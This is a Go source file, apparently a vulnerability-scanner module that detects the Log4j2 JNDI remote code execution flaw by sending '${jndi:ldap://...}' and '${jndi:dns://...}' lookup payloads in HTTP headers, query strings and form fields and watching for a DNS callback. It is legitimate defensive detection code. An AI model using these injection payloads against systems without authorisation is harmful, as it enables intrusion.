/*
 * Copyright 2026 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

// Package cve202144228 detects Apache Log4j2 Remote Code Execution via JNDI
// lookup evaluation (CVE-2021-44228 and CVE-2021-45046) using out-of-band
// callback server verification.
package cve202144228

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/google/goonami-scanner/common/clients/callbackserver"
	"github.com/google/goonami-scanner/core/config"
	"github.com/google/goonami-scanner/core/log"
	"github.com/google/goonami-scanner/core/module"
	goohttp "github.com/google/goonami-scanner/core/net/http"
	"github.com/google/goonami-scanner/core/net/netservice"

	cbpb "github.com/google/goonami-scanner/tools/callbackserver/callbackserver_config_go_proto"
	dpb "github.com/google/tsunami-security-scanner/proto/go/detection_go_proto"
	npb "github.com/google/tsunami-security-scanner/proto/go/network_go_proto"
	nspb "github.com/google/tsunami-security-scanner/proto/go/network_service_go_proto"
	rpb "github.com/google/tsunami-security-scanner/proto/go/reconnaissance_go_proto"
	vpb "github.com/google/tsunami-security-scanner/proto/go/vulnerability_go_proto"
	tspb "google.golang.org/protobuf/types/known/timestamppb"
)

const (
	moduleName = "dt/cve202144228"

	vulnPublisher      = "GOOGLE"
	vulnMainID         = "CVE_2021_44228"
	vulnCVEID          = "CVE-2021-44228"
	vulnTitle          = "Log4j2 Remote Code Execution via JNDI (CVE-2021-44228)"
	vulnDescription    = "Services depending on Apache Log4j2 (org.apache.logging.log4j:log4j-core versions 2.0-beta9 through 2.14.1, and 2.15.0 via CVE-2021-45046) evaluate JNDI lookup expressions (${jndi:...}) in logged HTTP headers, paths, query parameters, and form parameters, allowing unauthenticated attackers to trigger outbound JNDI lookups and remote code execution."
	vulnRecommendation = "Upgrade Apache Log4j2 (log4j-core) to version 2.17.1 or later (2.12.4 for Java 7, 2.3.2 for Java 6). Where an immediate upgrade is not possible, remove org/apache/logging/log4j/core/lookup/JndiLookup.class from all log4j-core JAR archives on the classpath."

	secretByteLen               = 32
	maxCrawledURLs              = 15
	maxFuzzedRequestsPerPayload = 40
	maxDrainBytes               = 8192
	defaultPollAttempts         = 3
	defaultPollInterval         = 1 * time.Second
	notFoundSubpath             = "thispathshouldnotexist"
)

var (
	knownWebServiceNames = map[string]bool{
		"http":           true,
		"http-alt":       true,
		"http-proxy":     true,
		"https":          true,
		"https-alt":      true,
		"radan-http":     true,
		"ssl/http":       true,
		"ssl/http-alt":   true,
		"ssl/http-proxy": true,
		"ssl/https":      true,
	}

	fuzzedHeaderNames = []string{
		"User-Agent",
		"Referer",
		"Origin",
		"Cookie",
		"Authorization",
		"Accept-Language",
		"X-Forwarded-For",
		"X-Api-Version",
		"X-Requested-With",
		"X-CSRF-Token",
		"X-XSRF-Token",
		"X-Http-Method-Override",
		"X-Client-Data",
		"Pragma",
		"DNT",
	}
)

// Module implements module.VulnDetector for Apache Log4j2 JNDI RCE (CVE-2021-44228).
type Module struct {
	*module.BaseModule
	config       *config.Config
	randRead     func([]byte) (int, error)
	pollAttempts int
	pollInterval time.Duration
	nowFn        func() time.Time
}

func init() {
	module.RegisterDetector(moduleName, New)
}

// New returns a new instance of the CVE-2021-44228 detector module.
func New(ctx context.Context, cfg *config.Config) (module.VulnDetector, error) {
	return &Module{
		BaseModule:   module.NewBaseModule(moduleName),
		config:       cfg,
		randRead:     rand.Read,
		pollAttempts: defaultPollAttempts,
		pollInterval: defaultPollInterval,
		nowFn:        time.Now,
	}, nil
}

// Advisories returns the vulnerability metadata reported by this detector.
func (m *Module) Advisories() []*vpb.Vulnerability {
	return []*vpb.Vulnerability{baseVulnerability()}
}

func baseVulnerability() *vpb.Vulnerability {
	return vpb.Vulnerability_builder{
		MainId: vpb.VulnerabilityId_builder{
			Publisher: vulnPublisher,
			Value:     vulnMainID,
		}.Build(),
		RelatedId: []*vpb.VulnerabilityId{
			vpb.VulnerabilityId_builder{
				Publisher: "CVE",
				Value:     vulnCVEID,
			}.Build(),
		},
		Severity:       vpb.Severity_CRITICAL,
		Title:          vulnTitle,
		Description:    vulnDescription,
		Recommendation: vulnRecommendation,
	}.Build()
}

type reachabilityInfo struct {
	redirectURL string
	bodySample  string
}

type probeRequest struct {
	method      string
	targetURL   string
	contentType string
	body        string
	fuzzHeaders bool
}

// Detect probes a web service for Log4j2 JNDI lookup execution via callback server verification.
func (m *Module) Detect(ctx context.Context, service *nspb.NetworkService) (*dpb.DetectionReportList, error) {
	ctx = log.ContextForModuleAndService(ctx, m.Name(), service) // NOMUTANTS -- diagnostic log context
	if err := ctx.Err(); err != nil {
		return nil, err
	}

	if !isWebService(service) {
		return nil, nil
	}

	cbClient := callbackserver.DefaultClient()
	if !cbClient.IsCallbackServerEnabled() {
		log.DebugContextf(ctx, log.DebugLevelService, "callback server is disabled; skipping %s", moduleName) // NOMUTANTS -- diagnostic log
		return nil, nil
	}

	rootURL, err := buildWebRootURL(service)
	if err != nil {
		return nil, err
	}

	opts := goohttp.DefaultClientOptions()
	opts.DisableFollowRedirects = true // NOMUTANTS -- redirect Location is inspected explicitly
	httpClient, err := goohttp.NewClient(m.config, opts)
	if err != nil {
		return nil, err
	}

	secret, err := m.generateSecret()
	if err != nil {
		return nil, err
	}

	dnsDomain, err := cbClient.GetDNSCallbackDomain(secret)
	if err != nil {
		return nil, err
	}

	reachInfo, reachable, err := checkRootReachability(ctx, httpClient, rootURL)
	if err != nil || !reachable {
		return nil, err
	}

	payloads := buildJNDIPayloads(dnsDomain, m.config)
	for _, payload := range payloads {
		if err := ctx.Err(); err != nil {
			return nil, err
		}

		requests := buildProbeRequests(rootURL, reachInfo, service, payload)
		for _, pr := range requests {
			if err := sendProbeRequest(ctx, httpClient, pr, payload); err != nil {
				return nil, err
			}
		}

		interacted, err := checkInteraction(ctx, cbClient, secret)
		if err != nil {
			return nil, err
		}
		if interacted {
			return m.buildDetectionReport(service, dnsDomain), nil
		}
	}

	for attempt := 0; attempt < m.pollAttempts; attempt++ {
		select {
		case <-ctx.Done():
			return nil, ctx.Err()
		case <-time.After(m.pollInterval):
		}

		interacted, err := checkInteraction(ctx, cbClient, secret)
		if err != nil {
			return nil, err
		}
		if interacted {
			return m.buildDetectionReport(service, dnsDomain), nil
		}
	}

	return nil, nil
}

func isWebService(service *nspb.NetworkService) bool {
	if netservice.IsWebService(service) {
		return true
	}
	return knownWebServiceNames[strings.ToLower(strings.TrimSpace(service.GetServiceName()))]
}

func (m *Module) generateSecret() (string, error) {
	buf := make([]byte, secretByteLen)
	if _, err := m.randRead(buf); err != nil {
		return "", fmt.Errorf("generating callback secret: %w", err)
	}
	return hex.EncodeToString(buf), nil
}

func buildWebRootURL(service *nspb.NetworkService) (string, error) {
	webRoot, err := netservice.BuildWebRoot(service)
	if err != nil {
		return "", err
	}
	appRoot := strings.TrimSpace(service.GetServiceContext().GetWebServiceContext().GetApplicationRoot())
	if appRoot != "" {
		if strings.HasPrefix(appRoot, "http://") || strings.HasPrefix(appRoot, "https://") {
			return strings.TrimRight(appRoot, "/") + "/", nil
		}
		trimmed := strings.Trim(appRoot, "/")
		if trimmed != "" {
			return strings.TrimRight(webRoot, "/") + "/" + trimmed + "/", nil
		}
	}
	return strings.TrimRight(webRoot, "/") + "/", nil
}

func checkRootReachability(ctx context.Context, client goohttp.Client, rootURL string) (reachabilityInfo, bool, error) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, rootURL, nil)
	if err != nil {
		return reachabilityInfo{}, false, nil
	}

	resp, err := client.Do(req)
	if err != nil {
		if ctxErr := ctx.Err(); ctxErr != nil {
			return reachabilityInfo{}, false, ctxErr
		}
		log.DebugContextf(ctx, log.DebugLevelRequest, "initial HTTP reachability check to %q failed: %v", rootURL, err) // NOMUTANTS -- diagnostic log
		return reachabilityInfo{}, false, nil
	}
	defer resp.Body.Close()

	bodyBytes, _ := io.ReadAll(io.LimitReader(resp.Body, maxDrainBytes)) // NOMUTANTS -- bounded sample read
	info := reachabilityInfo{
		bodySample: string(bodyBytes),
	}

	if resp.StatusCode >= 300 && resp.StatusCode < 400 {
		if loc := strings.TrimSpace(resp.Header.Get("Location")); loc != "" {
			info.redirectURL = resolveSameHostURL(rootURL, loc)
		}
	}

	return info, true, nil
}

func resolveSameHostURL(baseURL, location string) string {
	baseParsed, err := url.Parse(baseURL)
	if err != nil {
		return ""
	}
	locParsed, err := url.Parse(location)
	if err != nil {
		return ""
	}
	resolved := baseParsed.ResolveReference(locParsed)
	if !strings.EqualFold(resolved.Host, baseParsed.Host) {
		return ""
	}
	if resolved.Scheme != "http" && resolved.Scheme != "https" {
		return ""
	}
	resolved.Fragment = ""
	if resolved.String() == baseURL {
		return ""
	}
	return resolved.String()
}

func buildJNDIPayloads(dnsDomain string, cfg *config.Config) []string {
	payloads := []string{
		fmt.Sprintf("${jndi:ldap://%s/a}", dnsDomain),
		fmt.Sprintf("${jndi:ldap://127.0.0.1#.%s/a}", dnsDomain),
		fmt.Sprintf("${jndi:dns://%s}", dnsDomain),
	}
	if localDNSAuth := localCallbackDNSAuthority(cfg); localDNSAuth != "" {
		payloads = append(payloads, fmt.Sprintf("${jndi:dns://%s/%s}", localDNSAuth, dnsDomain))
	}
	return payloads
}

func localCallbackDNSAuthority(cfg *config.Config) string {
	if cfg == nil {
		return ""
	}
	cbCfg := cfg.ClientsConfig().GetCallbackServer()
	dnsCfg := cbCfg.GetDnsRecordConfig()
	if dnsCfg.GetMode() != cbpb.CallbackEndpointMode_MODE_START_LOCAL_SERVER {
		return ""
	}
	dnsPort := dnsCfg.GetBindPort()
	if dnsPort == 0 {
		return ""
	}
	httpURI := cbCfg.GetHttpRecordConfig().GetPublicUri()
	parsed, err := url.Parse(httpURI)
	if err != nil || parsed.Hostname() == "" {
		return ""
	}
	return fmt.Sprintf("%s:%d", parsed.Hostname(), dnsPort)
}

func buildProbeRequests(rootURL string, info reachabilityInfo, service *nspb.NetworkService, payload string) []probeRequest {
	encodedPayload := url.QueryEscape(payload)
	seen := make(map[string]bool)
	var out []probeRequest

	addReq := func(pr probeRequest) {
		if len(out) >= maxFuzzedRequestsPerPayload { // NOMUTANTS -- defensive request cap
			return
		}
		key := fmt.Sprintf("%s|%s|%t|%s", pr.method, pr.targetURL, pr.fuzzHeaders, pr.body)
		if seen[key] {
			return
		}
		seen[key] = true
		out = append(out, pr)
	}

	headerTargets := []string{rootURL}
	if info.redirectURL != "" {
		headerTargets = append(headerTargets, info.redirectURL)
	}
	for _, target := range headerTargets {
		addReq(probeRequest{
			method:      http.MethodGet,
			targetURL:   target,
			fuzzHeaders: true,
		})
		addReq(probeRequest{
			method:      http.MethodPost,
			targetURL:   target,
			contentType: "application/x-www-form-urlencoded",
			body:        "q=" + encodedPayload,
			fuzzHeaders: true,
		})
	}

	for _, fuzzedURL := range fuzzURLQuery(rootURL, encodedPayload) {
		addReq(probeRequest{method: http.MethodGet, targetURL: fuzzedURL})
	}
	for _, fuzzedURL := range fuzzURLQuery(rootURL+notFoundSubpath, encodedPayload) {
		addReq(probeRequest{method: http.MethodGet, targetURL: fuzzedURL})
	}
	if info.redirectURL != "" {
		for _, fuzzedURL := range fuzzURLQuery(info.redirectURL, encodedPayload) {
			addReq(probeRequest{method: http.MethodGet, targetURL: fuzzedURL})
		}
	}

	crawlResults := service.GetServiceContext().GetWebServiceContext().GetCrawlResults()
	for i, cr := range crawlResults {
		if i >= maxCrawledURLs { // NOMUTANTS -- defensive crawl cap
			break
		}
		crawlTarget := cr.GetCrawlTarget()
		crawledURL := strings.TrimSpace(crawlTarget.GetUrl())
		if crawledURL == "" {
			continue
		}
		method := strings.ToUpper(strings.TrimSpace(crawlTarget.GetHttpMethod()))
		if method == "" {
			method = http.MethodGet
		}
		rawBody := string(crawlTarget.GetHttpRequestBody())
		for _, fuzzedURL := range fuzzURLQuery(crawledURL, encodedPayload) {
			addReq(probeRequest{
				method:    method,
				targetURL: fuzzedURL,
				body:      rawBody,
			})
		}
		if method == http.MethodPost && rawBody != "" {
			for _, fuzzedBody := range fuzzRawQuery(rawBody, encodedPayload) {
				addReq(probeRequest{
					method:      http.MethodPost,
					targetURL:   crawledURL,
					contentType: "application/x-www-form-urlencoded",
					body:        fuzzedBody,
				})
			}
		}
	}

	if solrBase := detectSolrBaseURL(rootURL, info, service); solrBase != "" {
		for _, solrEndpoint := range []string{
			solrBase + "admin/info/system?wt=json",
			solrBase + "admin/cores?action=STATUS&core=default",
		} {
			for _, fuzzedURL := range fuzzURLQuery(solrEndpoint, encodedPayload) {
				addReq(probeRequest{method: http.MethodGet, targetURL: fuzzedURL})
			}
		}
	}

	return out
}

func detectSolrBaseURL(rootURL string, info reachabilityInfo, service *nspb.NetworkService) string {
	softwareName := strings.ToLower(service.GetServiceContext().GetWebServiceContext().GetSoftware().GetName())
	isSolr := strings.Contains(softwareName, "solr") ||
		strings.Contains(strings.ToLower(info.redirectURL), "/solr") ||
		strings.Contains(strings.ToLower(rootURL), "/solr") ||
		strings.Contains(strings.ToLower(info.bodySample), "apache solr")
	if !isSolr {
		return ""
	}

	parsed, err := url.Parse(rootURL)
	if err != nil {
		return ""
	}
	return fmt.Sprintf("%s://%s/solr/", parsed.Scheme, parsed.Host)
}

func fuzzURLQuery(rawURL, encodedPayload string) []string {
	parsed, err := url.Parse(rawURL)
	if err != nil || (parsed.Scheme != "http" && parsed.Scheme != "https") || parsed.Host == "" {
		return nil
	}
	parsed.Fragment = ""
	if parsed.RawQuery == "" {
		u := *parsed
		u.RawQuery = "q=" + encodedPayload
		return []string{u.String()}
	}

	var out []string
	for _, fuzzedQuery := range fuzzRawQuery(parsed.RawQuery, encodedPayload) {
		u := *parsed
		u.RawQuery = fuzzedQuery
		out = append(out, u.String())
	}
	return out
}

func fuzzRawQuery(rawQuery, encodedPayload string) []string {
	parts := strings.Split(rawQuery, "&")
	var out []string
	seen := make(map[string]bool)
	for i, part := range parts {
		name := part
		if eqIdx := strings.IndexByte(part, '='); eqIdx >= 0 {
			name = part[:eqIdx]
		}
		if name == "" {
			continue
		}
		fuzzedParts := make([]string, len(parts))
		copy(fuzzedParts, parts)
		fuzzedParts[i] = name + "=" + encodedPayload
		candidate := strings.Join(fuzzedParts, "&")
		if !seen[candidate] {
			seen[candidate] = true
			out = append(out, candidate)
		}
	}
	return out
}

func sendProbeRequest(ctx context.Context, client goohttp.Client, pr probeRequest, rawPayload string) error {
	if err := ctx.Err(); err != nil {
		return err
	}

	var bodyReader io.Reader
	if pr.body != "" {
		bodyReader = strings.NewReader(pr.body)
	}
	req, err := http.NewRequestWithContext(ctx, pr.method, pr.targetURL, bodyReader)
	if err != nil {
		return nil
	}
	if pr.body != "" {
		req.ContentLength = int64(len(pr.body))
	}
	if pr.contentType != "" {
		req.Header.Set("Content-Type", pr.contentType)
	}
	if pr.fuzzHeaders {
		for _, headerName := range fuzzedHeaderNames {
			req.Header.Set(headerName, rawPayload)
		}
	}

	resp, err := client.Do(req)
	if err != nil {
		if ctxErr := ctx.Err(); ctxErr != nil {
			return ctxErr
		}
		log.DebugContextf(ctx, log.DebugLevelRequest, "HTTP probe to %q failed: %v", pr.targetURL, err) // NOMUTANTS -- diagnostic log
		return nil
	}
	defer resp.Body.Close()
	_, _ = io.Copy(io.Discard, io.LimitReader(resp.Body, maxDrainBytes)) // NOMUTANTS -- bounded connection drain
	return ctx.Err()
}

func checkInteraction(ctx context.Context, cbClient *callbackserver.Client, secret string) (bool, error) {
	interacted, err := cbClient.HasInteraction(ctx, secret)
	if err != nil {
		if ctxErr := ctx.Err(); ctxErr != nil {
			return false, ctxErr
		}
		log.DebugContextf(ctx, log.DebugLevelService, "callback polling failed: %v", err) // NOMUTANTS -- diagnostic log
		return false, nil
	}
	return interacted, nil
}

func (m *Module) buildDetectionReport(service *nspb.NetworkService, dnsDomain string) *dpb.DetectionReportList {
	vuln := baseVulnerability()
	vuln.SetAdditionalDetails([]*vpb.AdditionalDetail{
		vpb.AdditionalDetail_builder{
			Description: "Verified out-of-band Log4j2 JNDI callback interaction",
			TextData: vpb.TextData_builder{
				Text: fmt.Sprintf("Target evaluated a Log4j2 ${jndi:...} lookup expression and initiated an out-of-band callback interaction to %s.", dnsDomain),
			}.Build(),
		}.Build(),
	})

	return dpb.DetectionReportList_builder{
		DetectionReports: []*dpb.DetectionReport{
			dpb.DetectionReport_builder{
				TargetInfo: rpb.TargetInfo_builder{
					NetworkEndpoints: []*npb.NetworkEndpoint{
						service.GetNetworkEndpoint(),
					},
				}.Build(),
				NetworkService:     service,
				DetectionTimestamp: tspb.New(m.nowFn()),
				DetectionStatus:    dpb.DetectionStatus_VULNERABILITY_VERIFIED,
				Vulnerability:      vuln,
			}.Build(),
		},
	}.Build()
}
